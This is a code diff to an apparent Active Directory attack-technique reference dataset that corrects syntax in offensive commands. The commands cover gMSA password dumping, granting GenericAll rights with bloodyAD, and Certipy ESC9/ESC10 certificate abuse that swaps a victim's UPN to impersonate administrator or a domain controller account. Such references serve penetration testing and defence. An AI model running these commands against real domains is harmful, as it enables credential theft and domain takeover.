@@ -814,7 +814,7 @@ export const adAdditionNodes: TechniqueNodeDef[] = [
     commands: [
       { label: 'Dump gMSA password/hash', code: r`gMSADumper.py -u user -p pass -d domain.local`, lang: 'bash' },
       { label: 'Read gMSA via NetExec (LDAPS)', code: r`nxc ldap dc01 -d domain.local -u user -p pass --gmsa`, lang: 'bash' },
-      { label: 'Grant yourself retrieval rights first (GenericAll)', code: r`bloodyAD -u user -p pass -d domain.local --host dc01 add gmsaGroup '<gMSA$>' '<attacker>'`, lang: 'bash' },
+      { label: 'Grant yourself retrieval rights first (GenericAll)', code: r`bloodyAD -u user -p pass -d domain.local --host dc01 add genericAll '<gMSA$>' '<attacker>'`, lang: 'bash' },
     ],
     requires: ['Membership in the gMSA\'s msDS-GroupMSAMembership (PrincipalsAllowedToRetrieveManagedPassword), or GenericAll to grant it', 'LDAPS reachable (NetExec --gmsa requires it)'],
     versions: ['srv2012', 'srv2016', 'srv2019', 'srv2022', 'srv2025'],
@@ -1172,9 +1172,9 @@ export const adAdditionNodes: TechniqueNodeDef[] = [
     tools: [{ name: 'Certipy', url: 'https://github.com/ly4k/Certipy' }],
     commands: [
       { label: 'Get the victim NT hash (shadow creds)', code: r`certipy shadow auto -u user@domain.local -p pass -account victim -dc-ip 10.0.0.1`, lang: 'bash' },
-      { label: "Swap the victim's UPN to the target", code: r`certipy account update -u user@domain.local -p pass -user victim -upn administrator@domain.local`, lang: 'bash' },
+      { label: "Swap the victim's UPN to the target", code: r`certipy account -u user@domain.local -p pass -user victim -upn administrator@domain.local update`, lang: 'bash' },
       { label: 'Enroll as the victim on the ESC9 template', code: r`certipy req -u victim@domain.local -hashes :<victim_nt> -dc-ip 10.0.0.1 -ca CORP-CA -template ESC9`, lang: 'bash' },
-      { label: 'Revert UPN, then auth as the target', code: r`certipy account update -u user@domain.local -p pass -user victim -upn victim@domain.local`, lang: 'bash' },
+      { label: 'Revert UPN, then auth as the target', code: r`certipy account -u user@domain.local -p pass -user victim -upn victim@domain.local update`, lang: 'bash' },
     ],
     requires: ['Template with CT_FLAG_NO_SECURITY_EXTENSION + client auth', 'GenericWrite over a victim account', 'StrongCertificateBindingEnforcement != 2'],
     mitre: mitre('T1649'),
@@ -1196,8 +1196,8 @@ export const adAdditionNodes: TechniqueNodeDef[] = [
       'ESC10 abuses weak certificate-to-account mapping on the DCs. Case 1, StrongCertificateBindingEnforcement = 0: like ESC9, write a victim UPN to the target and enroll/auth (no SID extension required). Case 2, CertificateMappingMethods = 0x4 (UPN-only): repoint a victim UPN at an account with no UPN (a machine account or built-in Administrator) and authenticate as it, typically via Schannel/LDAP. Both turn a write-over-a-victim edge into impersonation.',
     tools: [{ name: 'Certipy', url: 'https://github.com/ly4k/Certipy' }],
     commands: [
-      { label: "Case 1: swap victim's UPN to target", code: r`certipy account update -u user@domain.local -p pass -user victim -upn administrator@domain.local`, lang: 'bash' },
-      { label: 'Case 2: point victim UPN at a machine account', code: r`certipy account update -u user@domain.local -p pass -user victim -upn 'DC01$@domain.local'`, lang: 'bash' },
+      { label: "Case 1: swap victim's UPN to target", code: r`certipy account -u user@domain.local -p pass -user victim -upn administrator@domain.local update`, lang: 'bash' },
+      { label: 'Case 2: point victim UPN at a machine account', code: r`certipy account -u user@domain.local -p pass -user victim -upn 'DC01$@domain.local' update`, lang: 'bash' },
       { label: 'Enroll as victim then auth (LDAP shell)', code: r`certipy req -u victim@domain.local -hashes :<victim_nt> -ca CORP-CA -template User` + '\n' + r`certipy auth -pfx victim.pfx -dc-ip 10.0.0.1 -ldap-shell`, lang: 'bash' },
     ],
     requires: ['StrongCertificateBindingEnforcement = 0 (Case 1) or CertificateMappingMethods = 0x4 (Case 2)', 'GenericWrite over a victim account', 'A client-auth template open to the victim'],
